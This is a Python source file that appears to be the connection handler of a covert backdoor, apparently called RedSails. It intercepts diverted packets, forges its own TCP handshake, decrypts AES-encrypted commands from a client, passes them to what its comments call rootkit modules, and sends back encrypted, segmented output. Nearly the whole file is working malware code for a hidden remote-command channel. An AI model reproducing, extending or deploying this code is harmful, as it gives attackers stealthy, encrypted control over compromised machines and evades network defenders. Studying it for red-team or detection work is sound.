from random import randint

# Custom modules
from rsHelper.rsUtils import *
from rsNetworking import *
from rsModules.rsPayloadUtils import *
from rsCrypto.rsCrypto import AESCipher

class ConnectionsHandler:
	def __init__(self, port, password):
		# Configure and start listener
		self.port = port

		# Start listener on given port
		self.listenerCH = TCPListener(self.port)
		self.listenerCH.startListener()

		# Create debug logging object
		#self.loggingCH = loggingUtils("redsails-main-debug.log")
		
		# Holds the TCP connection records
		self.connectionRecords = []

		# Holds broken up responses to support large command output
		self.resp_list = []

		# object for encrypting and decrypting our traffic
		self.AESCrypto = AESCipher(password)

		# Starts the main loop
		self.handleConnections()

	def handleConnections(self):
		# Enable for debugging on the command line
		#print "[+] Backdoor connection handler started..."
		while self.listenerCH.isListening == True:
			# Get diverted packet
			self.listenerCH.recvPacket()

			# Create a local instance of the packet
			self.packet = self.listenerCH.packet

			# True if the packet received is an initial SYN packet
			if TCPHelper().isInitConnection(self.packet):
				
				# DEBUG - Log packet to debug log
				#self.loggingCH.logPacket(self.packet, "INBOUND - Init connection")
				
				# Create and store initial TCP record
				self.initTCPRecord()

				# Send appropriate response packet
				self.initResponse()

				# DEBUG - Log packet to debug log
				#self.loggingCH.logPacket(self.packet, "OUTBOUND - Init response")

			# [i] All other packets flow through here; the following should be true...
			#	1) Maps to a valid TCP connection record
			#	2) ACK packet finalizing a valid connection || Packet is apart of a valid connection
			else:
				# True if a connection record is found
				if self.getConnectionRecord():
					# True if packet is final ACK response to establish the TCP connection
					if self.isFinalConnectionPacket():
						# Sets TCP record to Connected=True and updates SEQ/ACK and Flags
						self.updateRecordToConnected()

						# DEBUG - Log packet to debug log
						#self.loggingCH.logPacket(self.packet, "ESTABLISHING - Final ACK")

					# True if the packet is part of an already established connection
					elif self.currentRecord["Connected"] == True:
						# DEBUG - Log packet to debug log
						#self.loggingCH.logPacket(self.packet, "CONNECTED")

						# At this point the packet is from a connected host
						# Check if host is terminating the connectioin
						self.isDisconnecting()
						if self.isDisconnectingSession:
							self.updateConnectionRecord()
							self.sendResponsePacket()
							self.sendResetPacketToConnected()
							self.connectionRecords.pop(self.index)

							# DEBUG - Log packet to debug log
							#self.loggingCH.logPacket(self.packet, "DISCONNECTED")

						# Packet is from connected host
						# Process packet payload for modules calls and commands
						else:
							self.updateConnectionRecord()
							# Decrypt packet payload from client for processing
							try:
								decPacketPayload = self.AESCrypto.decrypt(self.packet.tcp.payload)								
								self.packet.tcp.payload = decPacketPayload

							except Exception as e:
								pass
							
							# [i] Packet processing for rootkit modules starts here
							# 	1) Validate packet TCP flags (PSH|ACK)
							#	2) Analyze packet payload for valid module symantics
							#	3) Execute module if exists
							#	4) Send encrypted response
							self.moduleResponse = ModuleParsing(self.packet)
							#self.updateConnectionRecord()
							
							if self.moduleResponse.response == "xxxEXITxxx":
								self.sendResponsePacket()
								self.sendResetPacketToConnected()
								self.connectionRecords.pop(self.index)

								# DEBUG - Log packet to debug log
								#self.loggingCH.logPacket(self.packet, "DISCONNECTED")
							
							elif len(self.resp_list) > 0 or self.packet.tcp.payload == "SEG::MORE":
								if len(self.resp_list) > 0:
									self.sendNextResponseSegment()

									# DEBUG - Log packet to debug log
									#self.loggingCH.logPacket(self.packet, "CONNECTED - RSP SGMNT")

								# Signal client to know module response has finished
								else:
									self.resp_list.append(self.AESCrypto.encrypt("SEG::END"))
									self.sendNextResponseSegment()
									self.resp_list = []

							else:
								self.sendResponsePacket()

								# DEBUG - Log packet to debug log
								#self.loggingCH.logPacket(self.packet, "CONNECTED")

					# Should not end up here...
					else:
						# DEBUG - Log packet to debug log
						#self.loggingCH.logPacket(self.packet, "ROGUE - w/ Connection Record")
						pass

				# [i] True if the incoming packet...
				#	1) is not an initial connection packet (SYN packet)
				#	2) is not finalizing a connection handshake (ACK packet w/ matching SEQ/ACK)
				#	3) is not a part of an already established connection, unless
				#		it is a RST or FIN|ACK trying to close connection
				else:
					# DEBUG - Log packet to debug log
					#self.loggingCH.logPacket(self.packet, "ROGUE")
					# Send an RST to the host after testing we are not leaking valid packets here
					pass

	def initTCPRecord(self):
		# Sets 'self.flags' from current packet flag settings
		self.getFlags()

		self.record = {}
		self.record["SrcIP"] = self.packet.src_addr
		self.record["SrcPort"] = self.packet.src_port
		self.record["DstIP"] = self.packet.dst_addr
		self.record["DstPort"] = self.packet.dst_port

		self.record["ClntSEQ"] = self.packet.tcp.seq_num
		self.record["ClntACK"] = self.packet.tcp.ack_num
		self.record["ClntLEN"] = len(self.packet.tcp.payload)
		self.record["ClntFLAGS"] = self.flags

		self.record["SrvSEQ"] = randint(0,4294967291)
		self.record["SrvACK"] = self.packet.tcp.seq_num + 1
		self.record["SrvLEN"] = 0
		self.record["SrvFLAGS"] = [1, 1, 0, 0, 0]

		self.record["Connected"] = False

		self.record["Segments"] = 0
		self.record["SegIndex"] = 0

		# Store init record to list
		self.connectionRecords.append(self.record)

	def initResponse(self):
		self.packet.src_addr = self.record["DstIP"]
		self.packet.src_port = self.record["DstPort"]
		self.packet.dst_addr = self.record["SrcIP"]
		self.packet.dst_port = self.record["SrcPort"]

		self.packet.tcp.seq_num = self.record["SrvSEQ"]
		self.packet.tcp.ack_num = self.record["SrvACK"]

		self.packet.tcp.payload = ""

		flags = self.record["SrvFLAGS"]
		if flags[0]:
			self.packet.tcp.syn = 1
		else:
			self.packet.tcp.syn = 0

		if flags[1]:
			self.packet.tcp.ack = 1
		else:
			self.packet.tcp.ack = 0

		if flags[2]:
			self.packet.tcp.psh = 1
		else:
			self.packet.tcp.psh = 0

		if flags[3]:
			self.packet.tcp.fin = 1
		else:
			self.packet.tcp.fin = 0

		if flags[4]:
			self.packet.tcp.rst = 1
		else:
			self.packet.tcp.rst = 0

		self.packet.direction = 0

		self.listenerCH.packet = self.packet
		self.listenerCH.sendPacket()

	def getFlags(self):
		self.flags = [0, 0, 0, 0, 0]

		if self.packet.tcp.syn == True:
			self.flags[0] = 1

		if self.packet.tcp.ack == True:
			self.flags[1] = 1

		if self.packet.tcp.psh == True:
			self.flags[2] = 1

		if self.packet.tcp.fin == True:
			self.flags[3] = 1

		if self.packet.tcp.rst == True:
			self.flags[4] = 1

	def getConnectionRecord(self):
		self.currentRecord = []
		self.index = 0

		for rec in self.connectionRecords:
			sourceIP = False
			sourcePort = False
			destIP = False
			destPort = False
			matchAckSeq = False

			if (rec["SrcIP"] == self.packet.src_addr):
				sourceIP = True

			if (rec["SrcPort"] == self.packet.src_port):
				sourcePort = True

			if (rec["DstIP"] == self.packet.dst_addr):
				destIP = True

			if (rec["DstPort"] == self.packet.dst_port):
				destPort = True

			if (rec["SrvACK"] == self.packet.tcp.seq_num):
				matchAckSeq = True

			# True if record is found, sets 'currentRecord' to located record
			if (sourceIP and sourcePort and destIP and destPort and matchAckSeq):
				self.currentRecord = self.connectionRecords[self.index]
				return True

			self.index += 1

		# Returns false if a valid connection record is not located
		return False

	def isFinalConnectionPacket(self):
		only_ACK = False
		null_payload = False
		match_ACK2SEQ = False
		connected = False

		self.getFlags()

		if (self.flags[1] == 1) and ((self.flags[0]+self.flags[2]+self.flags[3]+self.flags[4]) == 0):
			only_ACK = True

		if (len(self.packet.tcp.payload) == 0):
			null_payload = True

		if (self.packet.tcp.seq_num == self.currentRecord["SrvACK"]):
			match_ACK2SEQ = True

		if (self.currentRecord["Connected"] == False):
			connected = False

		if (only_ACK and null_payload and match_ACK2SEQ and not connected):
			return True

		else:
			return False

	def isDisconnecting(self):
		self.getFlags()

		# Check of RST or FIN|ACK packet
		if ((self.flags[4]==1) or (self.flags[3]==1 and self.flags[1]==1)):
			self.isDisconnectingSession = True

		else:
			self.isDisconnectingSession = False

	def updateRecordToConnected(self):
		self.getFlags()

		self.currentRecord["ClntSEQ"] = self.packet.tcp.seq_num
		self.currentRecord["ClntACK"] = self.packet.tcp.ack_num
		self.currentRecord["ClntLEN"] = len(self.packet.tcp.payload)
		self.currentRecord["ClntFLAGS"] = self.flags

		self.currentRecord["Connected"] = True

	def updateConnectionRecord(self):
		self.getFlags()

		self.currentRecord["ClntSEQ"] = self.packet.tcp.seq_num
		self.currentRecord["ClntACK"] = self.packet.tcp.ack_num
		self.currentRecord["ClntLEN"] = len(self.packet.tcp.payload)
		self.currentRecord["ClntFLAGS"] = self.flags

		self.currentRecord["SrvSEQ"] = self.packet.tcp.ack_num
		self.currentRecord["SrvACK"] = self.packet.tcp.seq_num + len(self.packet.tcp.payload)
		self.currentRecord["SrvLEN"] = len(self.packet.tcp.payload)
		self.currentRecord["SrvFLAGS"] = [0, 1, 1, 0, 0]

	def sendResponsePacket(self):
		# Modify packet direction back to client:port
		self.packet.src_addr = self.currentRecord["DstIP"]
		self.packet.src_port = self.currentRecord["DstPort"]
		self.packet.dst_addr = self.currentRecord["SrcIP"]
		self.packet.dst_port = self.currentRecord["SrcPort"]

		self.packet.tcp.seq_num = self.currentRecord["ClntACK"]
		self.packet.tcp.ack_num = self.currentRecord["ClntSEQ"] + self.currentRecord["ClntLEN"]

		self.packet.direction = 0

		# Construct packet flags to send response
		self.packet.tcp.syn = 0
		self.packet.tcp.ack = 1
		self.packet.tcp.psh = 1
		self.packet.tcp.fin = 0
		self.packet.tcp.rst = 0

		self.packet.tcp.payload = ""

		try:
			# This breaks up the response if too large for one packet
			for seg in [self.moduleResponse.response[i:i + 1000] for i in range(0, len(self.moduleResponse.response), 1000)]:
				self.resp_list.append(self.AESCrypto.encrypt(seg))

		except Exception as e:
			#print "[!] Error segmenting response payload - sendResponsePacket()\n", e
			pass

		# Catch and handles commands that do not return a response when executed
		try:
			self.packet.tcp.payload = self.resp_list[0]
			self.resp_list.pop(0)

		except:
			self.packet.tcp.payload = " "

		self.listenerCH.packet = self.packet
		self.listenerCH.sendPacket()

	def sendNextResponseSegment(self):
		# Modify packet direction back to client:port
		self.packet.src_addr = self.currentRecord["DstIP"]
		self.packet.src_port = self.currentRecord["DstPort"]
		self.packet.dst_addr = self.currentRecord["SrcIP"]
		self.packet.dst_port = self.currentRecord["SrcPort"]

		self.packet.tcp.seq_num = self.currentRecord["ClntACK"]
		self.packet.tcp.ack_num = self.currentRecord["ClntSEQ"] + self.currentRecord["ClntLEN"]

		self.packet.direction = 0

		# Construct packet flags to send response
		self.packet.tcp.syn = 0
		self.packet.tcp.ack = 1
		self.packet.tcp.psh = 1
		self.packet.tcp.fin = 0
		self.packet.tcp.rst = 0

		self.packet.tcp.payload = ""
		
		self.packet.tcp.payload = self.resp_list[0]
		self.resp_list.pop(0)

		self.listenerCH.packet = self.packet
		self.listenerCH.sendPacket()

	def sendResetPacketToConnected(self):
		# Modify packet direction back to client:port
		self.packet.src_addr = self.currentRecord["DstIP"]
		self.packet.src_port = self.currentRecord["DstPort"]
		self.packet.dst_addr = self.currentRecord["SrcIP"]
		self.packet.dst_port = self.currentRecord["SrcPort"]

		self.packet.tcp.seq_num = self.currentRecord["ClntACK"]
		self.packet.tcp.ack_num = self.currentRecord["ClntSEQ"] + self.currentRecord["ClntLEN"]

		self.packet.direction = 0

		# First we send a ACK response to acknowledge client packet
		self.packet.tcp.syn = 0
		self.packet.tcp.ack = 1
		self.packet.tcp.psh = 0
		self.packet.tcp.fin = 0
		self.packet.tcp.rst = 0

		self.packet.tcp.payload = ""

		self.listenerCH.packet = self.packet
		self.listenerCH.sendPacket()

		# Second we send an RST to forcefully close the connection
		self.packet.tcp.ack = 0
		self.packet.tcp.rst = 1

		self.listenerCH.packet = self.packet
		self.listenerCH.sendPacket()
